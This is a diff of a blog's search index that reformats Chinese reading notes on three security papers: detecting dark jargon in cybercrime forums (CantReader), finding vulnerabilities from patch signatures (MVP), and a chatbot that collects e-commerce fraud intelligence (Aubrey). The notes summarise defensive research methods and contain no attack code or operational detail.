@@ -1,354 +1,154 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>(USENIX)读书笔记 Automatically Identifying and Understanding Dark Jargons from Cybercrime Marketplaces</title>
-      <link href="/2020/06/11/usenix-18-KanYuan/"/>
-      <url>/2020/06/11/usenix-18-KanYuan/</url>
-      
-        <content type="html"><![CDATA[<p>本文发表于 27th USENIX Security Symposium。针对地下论坛中黑色术语 (Dark Jargon) 的识别，理解提出相应的<a href="https://sites.google.com/view/cantreader" target="_blank" rel="noopener">解决方案</a>。第一作者 Kan Yuan 为印第安纳大学Bloomington分校的一名 Ph.D. 学生，其研究方向主要是安全和隐私。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>黑色术语在地下论坛中通常应用于一些黑色交易，它们本来是在正常对话中出现的常用词，但在地下论坛中往往被赋予了其他意思。比如：”popcorn” 其本意是一种食物，但其在地下论坛中成为了 drug 的代名词。</p><p>当前主要通过人工的手段来检测黑色术语，这样容易出错且效率低，无法赶上黑色术语更新换代的速度。</p><h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><p>如图所示，本文提出了一种自动检测并理解黑色术语的技术 Cantreader。检测方法增强了现有的词嵌入模型来分析给定词汇在合法文档与地下论坛中词义上的区别，并通过二元分类器来识别这些黑色术语的上位词，试图理解它们真正的含义。</p><p><figure class="figure"><img src="https://pic.downk.cc/item/5ebcf1f1c2a9a83be538b3dc.jpg" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p><ul><li><p>识别原理：当一个单词在地下论坛交流与在正常使用时的语义完全不同时，就可以认为它是一个黑色术语。</p></li><li><p>理解原理：某个单词在被认为是黑色术语后，其存在一个上位词，就可认为是可理解的。</p></li></ul><h3 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h3><ol><li>如何对某个术语在两个不同的语料库中的语义差异进行建模？</li><li>如何处理即使在合法语料库中也有不同用法的术语？</li><li>如何理解黑色术语的真正含义？</li></ol><h3 id="Cantreader"><a href="#Cantreader" class="headerlink" title="Cantreader"></a>Cantreader</h3><h4 id="检测模型：Semantic-Comparison-Model-SCM-解决了挑战1"><a href="#检测模型：Semantic-Comparison-Model-SCM-解决了挑战1" class="headerlink" title="检测模型：Semantic Comparison Model, SCM (解决了挑战1)"></a>检测模型：Semantic Comparison Model, SCM (解决了挑战1)</h4><p>SCM 由 Word2Vec 扩展而来。如果两个不同的词在语料库中具有相似的上下文，则在给定上下文的情况下，Word2Vec 就会针对这两个词做出相似的预测。因此，训练过程将学习权重，以针对这两个单词产生相似的隐藏层输出，即单词的嵌入向量。嵌入向量是单词上下文的合理表示，上下文在某种程度上又表示单词的语义，所以这些向量之间的相似性描述了这些词的语义之间的相似性。</p><p>如果我们只想找<strong>同一语料库上</strong>训练的<strong>不同单词</strong>的语义相似性，Word2Vec 可能会非常有用。但对于黑色术语的识别，我们需要比较<strong>同一个单词</strong>在<strong>不同语料库</strong>的语义。这个问题既不能通过将两个语料库简单的合并（损失了一个单词在某个独立的语料库中的上下文信息）在一起解决，又不能通过训练两个单独的模型（Word2Vec的初始化时随机的）来回避。所以本文提出了 SCM。</p><p>SCM 相比于 Word2Vec 输入层的大小加倍了，而隐藏/输出层没有进行其他的处理。这样做了后，每个单词都有两个向量，每个向量描述该单词与其中一个语料库中其他单词的关系。 同时，这两个向量仍然是可比较的，因为它们在 Word2Vec 中一起使用，可以训练同一个 skip-gram 模型来预测上下文词的窗口。图1就是针对单词 w 的输入向量。</p><p><figure class="figure"><img src="https://pic.downk.cc/item/5e4144d62fb38b8c3c7cd5e1.jpg" alt="2.png"><figcaption class="figure__caption">2.png</figcaption></figure></p><p>该函数可将单词从两个语料库转换为独热向量。这使得SCM可以在训练阶段同时从两个语料库获得输入。它还为来自不同语料库的同一单词提供了不同分布的表示形式，从而确保了模型对两个语料库的区别对待。这样，在不同情况下（合法互动与地下交流）都可以保留单词的语义对于检测黑色术语至关重要。</p><p>本文针对该模型的性能进行的三个实验都表明其的高效力。</p><h4 id="黑色术语发现-解决了挑战2"><a href="#黑色术语发现-解决了挑战2" class="headerlink" title="黑色术语发现 (解决了挑战2)"></a>黑色术语发现 (解决了挑战2)</h4><h5 id="词汇表构建"><a href="#词汇表构建" class="headerlink" title="词汇表构建"></a>词汇表构建</h5><p>SCM 的词汇表是其的输入，其组成如下所示：</p><ul><li>由地下论坛生成的语料库与由合法互动生成的语料库的交集</li><li>除去所有的 “non-interesting” 词，比如停用词 [4]</li><li>在语料库中，上下文语境不够多样的词。min_count可以用于计数一个词在某个语料库中出现的次数，但其不能避免在地下论坛中一句话被反复引用的场景。所以本文使用了一种新的指标:窗口化上下文（windowed context）。使用此度量，我们根据单词在语料库中唯一窗口化上下文（num_wc）的数量来衡量单词的多样性。</li></ul><h5 id="术语的语义比较"><a href="#术语的语义比较" class="headerlink" title="术语的语义比较"></a>术语的语义比较</h5><p>SCM 使用了两个语料库作为输入：Cdark与Clegit，通过计算给定单词在两个语料库中的语义相似度来判定这个词是否带有不法意义。</p><p>我们无法仅仅因为一个单词在整个地下论坛和合法语料库中具有不同的语义，就断定其是一个黑黑色术语。如果合法语料库包含正式文件（例如来自Wikipedia和新闻文章的正式文件），则可能会导致误报。 这是因为这些文档中使用的单词与非正式论坛中的单词使用不同。 例如，在论坛上，”man” 通常用作问候的表达或表达愤怒或不满的感叹词，而在更正式的背景下，它通常表示成年男性。为了尽可能的使Clegit中词汇都是论坛用语，Cantreader利用合法论坛(reddit.com)上的帖子作为Clegit。</p><h5 id="特殊的语境"><a href="#特殊的语境" class="headerlink" title="特殊的语境"></a>特殊的语境</h5><p>不可避免在合法论坛中的一些词汇的上下文语境比较独特，所以与在不法论坛中合法的通用语义有所不同。为了避免这样的情况，本文又引入了一个语料库Crep，它包括更多正式的文档，这些文档在很大程度上使用了每个单词的词典含义。 本文选择 Wikipedia 作为 Crep。 通过在Clegit和Crep上训练SCM，Cantreader可以检测并删除在Clegit中带有非常规上下文的单词。</p><h5 id="阈值的选择"><a href="#阈值的选择" class="headerlink" title="阈值的选择"></a>阈值的选择</h5><p>综上，一个单词只有当其在 Cdark 与 Clegit 中的语义相似度低于某个阈值，且在 Clegit 与 Crep 中的语义相似度高于某个阈值时，才能被认定为黑色术语。那么如何找到恰当的阈值，也是一个难点。</p><p>由于 SCM 更倾向于给那些词义丰富的词语较高的语义相似性，所以对于词义丰富的词我们需要更大的阈值，反之亦然。本文将根据词语在Wordnet中的同义词个数来将词汇划为4个组（0个同义词，1-4个同义词，5-8个同义词，大于8个同义词），然后通过统计学的方法来给出每类相应的阈值大小。</p><h4 id="理解术语-（解决了挑战3）"><a href="#理解术语-（解决了挑战3）" class="headerlink" title="理解术语 （解决了挑战3）"></a>理解术语 （解决了挑战3）</h4><p>本文通过将给定词汇划分到特定上位词，来从一定程度上解释这些词汇在黑色论坛中的含义。自动生成语义理解的步骤如下：</p><ol><li>从人们在地下论坛上交易的常见产品中产生一组上位词候选。 </li><li>分析给定术语和所有候选词的语义（通过嵌入向量）</li><li>运行分类器以找出它们中的任何一个是否是术语的上位词。</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文提出了一种可用于比较给定单词在不同语料库中的语义相似性的模型（SCM)，并将该模型应用于网络犯罪场景中寻找黑色术语。值得一提的是，该模型是可扩展的，它可以用于比较给定单词在n个语料库中的语义，也可以用于寻找地下论坛黑色术语之外的其他场景。比如，在黑色术语发现时，我们就可以使用3个语料库$C_legit$, Cdark1, Cdark2，其中dark1，与dark2是两个具有相关活跃主题的地下论坛。SCM就可以计算给定单词在dark1与legit之间的相似性，再计算在dark1与dark2之间的相似性来进一步验证术语的正确性。</p><p>Cantreader的性能是语料库相关的，如果不法分子知道了这类工具的存在，在地下论坛中使用黑色术语的同时，也使用了其合法的含义来加以混淆，这样的方法就可能会影响到cantreader的效果。</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title><![CDATA[(USENIX)读书笔记 Automatically Identifying and Understanding Dark Jargons from Cybercrime Marketplaces]]></title>
+    <url>%2F2020%2F06%2F11%2Fusenix-18-KanYuan%2F</url>
+    <content type="text"><![CDATA[本文发表于 27th USENIX Security Symposium。针对地下论坛中黑色术语 (Dark Jargon) 的识别，理解提出相应的解决方案。第一作者 Kan Yuan 为印第安纳大学Bloomington分校的一名 Ph.D. 学生，其研究方向主要是安全和隐私。 背景黑色术语在地下论坛中通常应用于一些黑色交易，它们本来是在正常对话中出现的常用词，但在地下论坛中往往被赋予了其他意思。比如：”popcorn” 其本意是一种食物，但其在地下论坛中成为了 drug 的代名词。 当前主要通过人工的手段来检测黑色术语，这样容易出错且效率低，无法赶上黑色术语更新换代的速度。 主要内容如图所示，本文提出了一种自动检测并理解黑色术语的技术 Cantreader。检测方法增强了现有的词嵌入模型来分析给定词汇在合法文档与地下论坛中词义上的区别，并通过二元分类器来识别这些黑色术语的上位词，试图理解它们真正的含义。 1.png 识别原理：当一个单词在地下论坛交流与在正常使用时的语义完全不同时，就可以认为它是一个黑色术语。 理解原理：某个单词在被认为是黑色术语后，其存在一个上位词，就可认为是可理解的。 挑战 如何对某个术语在两个不同的语料库中的语义差异进行建模？ 如何处理即使在合法语料库中也有不同用法的术语？ 如何理解黑色术语的真正含义？ Cantreader检测模型：Semantic Comparison Model, SCM (解决了挑战1)SCM 由 Word2Vec 扩展而来。如果两个不同的词在语料库中具有相似的上下文，则在给定上下文的情况下，Word2Vec 就会针对这两个词做出相似的预测。因此，训练过程将学习权重，以针对这两个单词产生相似的隐藏层输出，即单词的嵌入向量。嵌入向量是单词上下文的合理表示，上下文在某种程度上又表示单词的语义，所以这些向量之间的相似性描述了这些词的语义之间的相似性。 如果我们只想找同一语料库上训练的不同单词的语义相似性，Word2Vec 可能会非常有用。但对于黑色术语的识别，我们需要比较同一个单词在不同语料库的语义。这个问题既不能通过将两个语料库简单的合并（损失了一个单词在某个独立的语料库中的上下文信息）在一起解决，又不能通过训练两个单独的模型（Word2Vec的初始化时随机的）来回避。所以本文提出了 SCM。 SCM 相比于 Word2Vec 输入层的大小加倍了，而隐藏/输出层没有进行其他的处理。这样做了后，每个单词都有两个向量，每个向量描述该单词与其中一个语料库中其他单词的关系。 同时，这两个向量仍然是可比较的，因为它们在 Word2Vec 中一起使用，可以训练同一个 skip-gram 模型来预测上下文词的窗口。图1就是针对单词 w 的输入向量。 2.png 该函数可将单词从两个语料库转换为独热向量。这使得SCM可以在训练阶段同时从两个语料库获得输入。它还为来自不同语料库的同一单词提供了不同分布的表示形式，从而确保了模型对两个语料库的区别对待。这样，在不同情况下（合法互动与地下交流）都可以保留单词的语义对于检测黑色术语至关重要。 本文针对该模型的性能进行的三个实验都表明其的高效力。 黑色术语发现 (解决了挑战2)词汇表构建SCM 的词汇表是其的输入，其组成如下所示： 由地下论坛生成的语料库与由合法互动生成的语料库的交集 除去所有的 “non-interesting” 词，比如停用词 [4] 在语料库中，上下文语境不够多样的词。min_count可以用于计数一个词在某个语料库中出现的次数，但其不能避免在地下论坛中一句话被反复引用的场景。所以本文使用了一种新的指标:窗口化上下文（windowed context）。使用此度量，我们根据单词在语料库中唯一窗口化上下文（num_wc）的数量来衡量单词的多样性。 术语的语义比较SCM 使用了两个语料库作为输入：Cdark与Clegit，通过计算给定单词在两个语料库中的语义相似度来判定这个词是否带有不法意义。 我们无法仅仅因为一个单词在整个地下论坛和合法语料库中具有不同的语义，就断定其是一个黑黑色术语。如果合法语料库包含正式文件（例如来自Wikipedia和新闻文章的正式文件），则可能会导致误报。 这是因为这些文档中使用的单词与非正式论坛中的单词使用不同。 例如，在论坛上，”man” 通常用作问候的表达或表达愤怒或不满的感叹词，而在更正式的背景下，它通常表示成年男性。为了尽可能的使Clegit中词汇都是论坛用语，Cantreader利用合法论坛(reddit.com)上的帖子作为Clegit。 特殊的语境不可避免在合法论坛中的一些词汇的上下文语境比较独特，所以与在不法论坛中合法的通用语义有所不同。为了避免这样的情况，本文又引入了一个语料库Crep，它包括更多正式的文档，这些文档在很大程度上使用了每个单词的词典含义。 本文选择 Wikipedia 作为 Crep。 通过在Clegit和Crep上训练SCM，Cantreader可以检测并删除在Clegit中带有非常规上下文的单词。 阈值的选择综上，一个单词只有当其在 Cdark 与 Clegit 中的语义相似度低于某个阈值，且在 Clegit 与 Crep 中的语义相似度高于某个阈值时，才能被认定为黑色术语。那么如何找到恰当的阈值，也是一个难点。 由于 SCM 更倾向于给那些词义丰富的词语较高的语义相似性，所以对于词义丰富的词我们需要更大的阈值，反之亦然。本文将根据词语在Wordnet中的同义词个数来将词汇划为4个组（0个同义词，1-4个同义词，5-8个同义词，大于8个同义词），然后通过统计学的方法来给出每类相应的阈值大小。 理解术语 （解决了挑战3）本文通过将给定词汇划分到特定上位词，来从一定程度上解释这些词汇在黑色论坛中的含义。自动生成语义理解的步骤如下： 从人们在地下论坛上交易的常见产品中产生一组上位词候选。 分析给定术语和所有候选词的语义（通过嵌入向量） 运行分类器以找出它们中的任何一个是否是术语的上位词。 总结本文提出了一种可用于比较给定单词在不同语料库中的语义相似性的模型（SCM)，并将该模型应用于网络犯罪场景中寻找黑色术语。值得一提的是，该模型是可扩展的，它可以用于比较给定单词在n个语料库中的语义，也可以用于寻找地下论坛黑色术语之外的其他场景。比如，在黑色术语发现时，我们就可以使用3个语料库$C_legit$, Cdark1, Cdark2，其中dark1，与dark2是两个具有相关活跃主题的地下论坛。SCM就可以计算给定单词在dark1与legit之间的相似性，再计算在dark1与dark2之间的相似性来进一步验证术语的正确性。 Cantreader的性能是语料库相关的，如果不法分子知道了这类工具的存在，在地下论坛中使用黑色术语的同时，也使用了其合法的含义来加以混淆，这样的方法就可能会影响到cantreader的效果。]]></content>
       <categories>
-          
-          <category> Paper </category>
-          
+        <category>Paper</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>(USENIX)论文笔记 Detecting Vulnerabilities using Patch-Enhanced Vulnerability Signatures</title>
-      <link href="/2020/05/20/MVP/"/>
-      <url>/2020/05/20/MVP/</url>
-      
-        <content type="html"><![CDATA[<blockquote><p>脆弱函数与修补后的函数之间可能存在很小的差异，而脆弱函数与待检测目标函数之间可能存在较大差异，这对基于克隆和基于函数匹配的方法识别这些重复出现的漏洞提出了挑战.</p></blockquote><h2 id="常见的漏洞检测方法"><a href="#常见的漏洞检测方法" class="headerlink" title="常见的漏洞检测方法"></a>常见的漏洞检测方法</h2><ul><li><p>基于克隆：将漏洞检测问题等价为代码克隆检测问题。通过从已知漏洞中提取语法级别的签名来识别。</p></li><li><p>基于函数匹配：通过从已知漏洞中提取漏洞函数相关的签名来识别。</p></li></ul><p>他们都没有考虑到漏洞是如何修复的，其实漏洞在打补丁前后的差别也是很微弱的。再者，那些从代码上差别很大的复用漏洞也没有办法用此类方法检测。</p><h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><ol><li><p>如何识别已经打过补丁的漏洞</p></li><li><p>对于已知漏洞，如何生成精确的签名</p></li></ol><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li><p>对于第一个挑战</p><ul><li><p>生成vulnerability signature -&gt; how vulnerability is caused</p></li><li><p>生成patch signature -&gt; how vulnerability is fixed</p></li></ul></li><li><p>对于第二个挑战</p><ul><li>精确的提取只与漏洞和补丁相关的代码片段</li></ul></li></ul><h2 id="模型架构"><a href="#模型架构" class="headerlink" title="模型架构"></a>模型架构</h2><p>分为三个模块</p><ol><li><p>提取函数签名，以目标系统代码为输入生成每个函数的签名</p></li><li><p>提取漏洞与补丁签名，以安全补丁为输入，生成漏洞签名与补丁签名</p></li><li><p>检测模块</p></li></ol><h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><ul><li>SourcererCC: <a href="https://arxiv.org/pdf/1512.06448.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1512.06448.pdf</a></li></ul>]]></content>
-      
-      
+  </entry>
+  <entry>
+    <title><![CDATA[(USENIX)论文笔记 Detecting Vulnerabilities using Patch-Enhanced Vulnerability Signatures]]></title>
+    <url>%2F2020%2F05%2F20%2FMVP%2F</url>
+    <content type="text"><![CDATA[脆弱函数与修补后的函数之间可能存在很小的差异，而脆弱函数与待检测目标函数之间可能存在较大差异，这对基于克隆和基于函数匹配的方法识别这些重复出现的漏洞提出了挑战. 常见的漏洞检测方法 基于克隆：将漏洞检测问题等价为代码克隆检测问题。通过从已知漏洞中提取语法级别的签名来识别。 基于函数匹配：通过从已知漏洞中提取漏洞函数相关的签名来识别。 他们都没有考虑到漏洞是如何修复的，其实漏洞在打补丁前后的差别也是很微弱的。再者，那些从代码上差别很大的复用漏洞也没有办法用此类方法检测。 挑战 如何识别已经打过补丁的漏洞 对于已知漏洞，如何生成精确的签名 方法 对于第一个挑战 生成vulnerability signature -&gt; how vulnerability is caused 生成patch signature -&gt; how vulnerability is fixed 对于第二个挑战 精确的提取只与漏洞和补丁相关的代码片段 模型架构分为三个模块 提取函数签名，以目标系统代码为输入生成每个函数的签名 提取漏洞与补丁签名，以安全补丁为输入，生成漏洞签名与补丁签名 检测模块 使用到的工具 SourcererCC: https://arxiv.org/pdf/1512.06448.pdf]]></content>
       <categories>
-          
-          <category> Paper </category>
-          
+        <category>Paper</category>
       </categories>
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>(NDSS)论文笔记 Understanding E-commerce Fraud from Autonomous Chat with Cybercriminals</title>
-      <link href="/2020/05/13/ndss-20-PengWang/"/>
-      <url>/2020/05/13/ndss-20-PengWang/</url>
-      
-        <content type="html"><![CDATA[<p>本文发表于 NDSS 2020，通过使用聊天机器人在匿名即时聊天中主动收集现实世界中网络犯罪的情报。第一作者为 Peng Wang 为印第安纳大学Bloomington 分校的一名 Ph.D. 学生，其研究方向主要是安全和隐私。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>与电子商务相关的欺诈活动（销售量膨胀，产品排名操控等）通常依赖于基于 IM(Instant Message) 的社交网络如 Telegram, QQ 等来实现。不法分子在即时群聊中宣传自己的攻击工具以及相应的服务，并通过一对一互动来提供购买链接。</p><p>这种通信行为轨迹对于了解电子商务欺诈具有无价的威胁情报，但获取情报往往需要和不法分子直接进行互动。</p><h3 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h3><p>谨慎的不法分子一般都只会在一对一互动中来分享有价值的情报，就导致了以往被动的情报收集方法（研究人员通过潜入 IM 聊天群组来被动的去收集多播信息）获取到的情报不那么的有价值。</p><p>而一对一的互动往往又需要人为的介入，并且新出现的电子商务不法行为的数量持续增长，从成本效益的角度来看，人为处理一对一对话是不可取的。</p><p>聊天机器人能够替代人为介入与不法分子进行交互，然而市面上可用的聊天机器人都不能够直接用于收集网络犯罪的威胁情报。有研究表明，为某种知识域设计的聊天机器人并不能很好的运用于其他域。我们首先需要了解针对特定犯罪的对话，才能够不被怀疑的与不法分子进行沟通。更复杂的是如何从战略上引导目标讨论各种地下活动，例如假帐户购买。</p><h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><p>本文提出了 Aubrey, 一个能主动从电商不法分子那里收集有效威胁情报的聊天机器人。</p><p>基本思想：一些人通过地下 IM 群组寻求资源（SIM卡）以及相应的工作（刷单），他们与那些不法分子（卖资源，工作提供者）的聊天模式通常是问题驱动的。即，他们问一个问题，并期望能够获得相应的资源或工作的答案，然后再进行下一个回合。这样的对话模式就使得我们可以通过有限状态机来对与给定不法分子的交互进行建模，从而实现自主对话。此类FSM由对话管理器运行，以引导与相关不法行为者的对话，从而主动收集威胁情报。</p><h3 id="Aubrey"><a href="#Aubrey" class="headerlink" title="Aubrey"></a>Aubrey</h3><p>Aubrey的结构如图2所示，Target Finder用于识别地下IM聊天群组中的不法分子以及其的角色。Strategy Genrator构建有限状态机（FSM）以及检索模型的对话资源。Dialog Manager通过运行FSM以及检索模型来指导与指定不法分子的交互，并输出对话以及威胁情报。<br><figure class="figure"><img src="https://pic.downk.cc/item/5eafa49dc2a9a83be5704491.jpg" alt="Fig2"><figcaption class="figure__caption">Fig2</figcaption></figure></p><h4 id="Target-Finder：识别地下聊天群组中不法分子的角色"><a href="#Target-Finder：识别地下聊天群组中不法分子的角色" class="headerlink" title="Target Finder：识别地下聊天群组中不法分子的角色"></a>Target Finder：识别地下聊天群组中不法分子的角色</h4><ol><li>首先运行两个二分类器来判断一个给定对象是upstream actor (SIM farmer,account merchant)还是downstream actor（fraud order operator)。如图1所示，upstream通常是用于提供一些攻击资产（如虚假账号等），downstream提供非法网络（如刷单平台等）。</li><li>由于SIM farmer和account merchant的群组消息具有相似的关键词，所以当给定对象的角色被判定为upstream actor的时候，还需要进一步利用情报来判定他们是SIM farmer还是account merchant。<br><figure class="figure"><img src="https://pic.downk.cc/item/5eafa87cc2a9a83be5737a2b.jpg" alt="Fig1"><figcaption class="figure__caption">Fig1</figcaption></figure></li></ol><h4 id="Strategy-Generation：构建有限状态机以及用于检索模型的知识源"><a href="#Strategy-Generation：构建有限状态机以及用于检索模型的知识源" class="headerlink" title="Strategy Generation：构建有限状态机以及用于检索模型的知识源"></a>Strategy Generation：构建有限状态机以及用于检索模型的知识源</h4><ol><li><p>识别对话中可以有哪些状态以及状态之间的关系。图3为三种不同角色的状态机示意图，其中圆圈代表了状态，连线代表状态之间的关系。</p><ul><li>首先是要通过基于语义相似性的聚类算法将完整的对话分为多个对话块。对话块是对话中一段关于同一主题的连续消息。</li><li>然后，使用与给定角色相关的关键词来识别每个对话块的主题。</li><li>主题，从对话中提取出的问题及其扩展构成了一个FSM状态。</li></ul></li><li><p>知识源扩展。当给定角色开始提问题时，系统就会开始从知识源中检索相应的响应，然而当下并没有现成的标注数据用于这个目的。所以本文作者从采集到的数据集中自动寻找与给定角色相关对话中的问题-解答对，并建立了建立状态与对话对之间的关系来让Aubrey更好地提问（即扩展FSM状态）。</p><ul><li>首先使用（1）中的方法将对话分成对话块。</li><li>然后独立地在每个对话块中寻找问题，并将紧跟其后的消息作为回答，以此构成一个（问题，回答）对。</li><li>去掉停用句以及一些问题形式的回答。</li><li>利用jieba从对话块中提取关键字列表，并使用Word2Vec来扩展这个关键字列表。</li><li>寻找包含这些关键字的对话对，并比较这些对话对中的问题与某个FSM状态中的问题的语义相似性，相似性大于0.9就可以把这个问题加入到这个状态。</li></ul></li></ol><p><figure class="figure"><img src="https://pic.downk.cc/item/5eb01a7fc2a9a83be5d69df3.jpg" alt="Fig3"><figcaption class="figure__caption">Fig3</figcaption></figure></p><h4 id="Dialog-Manager：指导状态间的过渡并利用检索模型处理问题"><a href="#Dialog-Manager：指导状态间的过渡并利用检索模型处理问题" class="headerlink" title="Dialog Manager：指导状态间的过渡并利用检索模型处理问题"></a>Dialog Manager：指导状态间的过渡并利用检索模型处理问题</h4><ol><li>Dialog Manager首先会从当前状态中随机选择一个问题向不法分子提问。</li><li><p>不法分子回答了问题之后，Dialog Manager就如图4所示对其的回答进行分析并调用相应的函数来转换系统的状态。</p><ul><li>回答分析：确定不法分子的回答是否定（”No fraud account available”），疑问（”How many accounts do you want?”），是否带有目标情报（”This is my store link”），还是什么都没有。<ul><li>否定是通过LTP库分析句子的语法结构检查其有无否定词来判断。</li><li>疑问是通过基于规则的检测技术来进行判断。例如：疑问词（5W1H + ?）。</li><li>是否携带威胁情报是首先通过检查回答中是否有相应的实体（通过URL正则匹配和关键主题词匹配），再比较回答是否与状态中对话回答语句有语义上的相似来确认。</li><li>情报以对的形式呈现（entity, type），是状态转换的根本依据。例如：(shop.91kami.com, store link) or (“new account”, account type)。<br><figure class="figure"><img src="https://pic.downk.cc/item/5eb01ebcc2a9a83be5db79a4.jpg" alt="Fig4"><figcaption class="figure__caption">Fig4</figcaption></figure></li></ul></li></ul></li><li><p>状态转换。表1展示了每个状态相应的转换表。状态转换可以用一个元组表示：（当前状态，条件，下一个状态）。</p><ul><li>如果某个回答是否定的，那么状态转换就可以表示为（(Start state), R is negative, (Cross-role state)）。</li><li>如果回答是一个问题，那么Aubrey就会在检索模型找到一个最相关的答复。状态转换就可以表述为(S, R is interrogative, (Retrieval model state))。检索模型比较问题与收集的对话对中的问题，找到最相似的那个问题，并返回该问题的答案。</li><li>如果回答中带有情报，那就可以跳过与该情报相关的状态，直接跳到收集下一个情报的相关状态。如图3(a)所示如果回答中包含了 SIM gateway 的情报，那么 Gateway 状态会直接被跳过，并来到 SimSource 状态。</li><li>如果回答里啥也没有，Dialog Manager就会保持当前的状态，并随机挑选另一个问题问卖家。如果两次尝试无果，就会切换到 Cross-role 状态。。<br><figure class="figure"><img src="https://pic.downk.cc/item/5eb023bbc2a9a83be5e15325.jpg" alt="Table1"><figcaption class="figure__caption">Table1</figcaption></figure><h3 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h3></li></ul></li></ol><h4 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h4><p><figure class="figure"><img src="https://pic.downk.cc/item/5eafac18c2a9a83be576c4b8.jpg" alt="Table2"><figcaption class="figure__caption">Table2</figcaption></figure></p><p>本文使用了如表2所示的三种数据库，分别包含了IM群组的聊天日志，对话种子以及地下论坛帖子。</p><ul><li><p>Seed dialog dataset：种子数据集包含来自某公司安全分析师在与不同电子商务不法分子对话中的20个会话跟踪样本，平均长度为40条消息。</p></li><li><p>IM group chat logs：该数据集中采集的数据来自QQ，本文作者搜索了某公司提供的50个与电子商务欺诈相关的种子关键词，并加入到搜索结果中前50名最活跃的小组。对于每个人小组，作者跟踪了07/2017-10/2018这16个月的聊天记录。共计100万个小组聊天记录，生成了50K个对话对。这些对话不仅与欺诈活动有关还与正常话题有关。</p></li><li><p>Undergrand forum threads：会话线程来自两个主流的地下电商论坛<a href="htys123.com">htys123.com</a>以及<a href="zuanke8.com">zuanke8.com</a>。其中25K个会话线程，250K个对话对来自<a href="htys123.com">htys123.com</a>，110K个会话线程，450K个对话来自<a href="zuanke8.com">zuanke8.com</a></p></li></ul><h4 id="评估结果"><a href="#评估结果" class="headerlink" title="评估结果"></a>评估结果</h4><p>采用 ground truth 数据集，其中包含 500个 upstream 提供商，180 个 downstream 提供商以及3000个不相关人员。最终 upstream 分类器实现了 87.0%的精度，91.2%的召回率， downstream 分类器实现了81.1%的精度，95.6%的召回率。在第二步分类中，以 SIM farmer 为正样本，最终的精度为89.0%，召回率为92.8%。</p><p>此外，本文在20,265个IM组成员的聊天记录上运行了Target Finder。 它报告了1,044位SIM farmer，700位帐号卖家和2,648个欺诈订单操作员。 图5显示了两个月新出现的活跃角色的数量，平均每月290个。 此外，Aubrey观察到的活跃角色总数在16个月内从707增加到2,064以及6月和11月由购物节带来的活跃角色数量的激增。</p><p><figure class="figure"><img src="https://pic.downk.cc/item/5eb03094c2a9a83be5f19fb2.jpg" alt="Fig5"><figcaption class="figure__caption">Fig5</figcaption></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文提出了一个用于主动收集威胁情报的聊天机器人 Aubrey，其使用了问题驱动的对话模式来对对话交互过程进行建模。结果显示了 Aubrey 能够有效的收集电子商务中的威胁情报，并曝光未知的欺诈相关的信息。</p><p>该文为将情报收集从被动化为主动开了一个很好的头，收集了更多高价值的高隐蔽性的情报。其中的产出如SIM卡相关信息等可以用做欺诈未知账号检测的重要特征。同时，也为电子商务公司防御这类欺诈行为提供了新思路。另外，该研究分析了整个欺诈生态系统中的链条，其中账号交易是处在最核心的地位，所以我们可以通过在账号注册过程中使用多重认证甚至是人机识别来提高注册的门槛，以减少电子商务欺诈行为。在文中，Aubrey仅仅用于在中国的电子商务平台中收集欺诈相关的情报，但我们只需要基于给定的目标，重新训练Aubrey中相应的模块就可以使其对其他国家相应的欺诈活动进行情报收集，甚至是与其他网络犯罪活动（经济诈骗，恶意软件倒卖等）中的不法分子进行交流。</p><p>但问题也随之到来。Aubrey在设计中并没有考虑不法分子的警惕性，尤其是在知道了 Aubrey 的存在之后，他们可能会问一些与相关交易无关的话题来测试对话者是否是个机器人，所以之后需要更多的实验来增加 Aubrey 的健壮性，比如对一些其他领域的问题也需要能够应答。同时，在网络犯罪中，不法分子通常会使用到一些行话来规避检测，本文提出的 Aubrey 暂时还没有考虑到这个问题，后续可以在其中增加一个行话识别的模块来解决这个问题。</p><h3 id="亮点"><a href="#亮点" class="headerlink" title="亮点"></a>亮点</h3><h3 id="Single-pass算法的使用"><a href="#Single-pass算法的使用" class="headerlink" title="Single-pass算法的使用"></a>Single-pass算法的使用</h3><p>原本single-pass算法可以用于对于文本的聚类，在本文中用在提取问答对。因为在一个thread中，问答不一定是依照顺序的。可能第一条是问题，第四条才是这个问题的答案，这个时候如果我们使用single-pass算法，前面的第二、三条与第一条都不大相关，它们会分为三个类。当迭代到第四条消息时，它会归到第一个类中，去形成一个问题对。</p><p>然后在看本文代码的时候发现，第二、三条都被当做了无关词和第一条放在了同一个类，在组成消息对时，就直接使用了第二条。建议可以在形成一个问答对之前，先检查问和其他所有回答的距离之后再来形成问答对，结果会更准确些。</p>]]></content>
-      
-      
+  </entry>
+  <entry>
+    <title><![CDATA[(NDSS)论文笔记 Understanding E-commerce Fraud from Autonomous Chat with Cybercriminals]]></title>
+    <url>%2F2020%2F05%2F13%2Fndss-20-PengWang%2F</url>
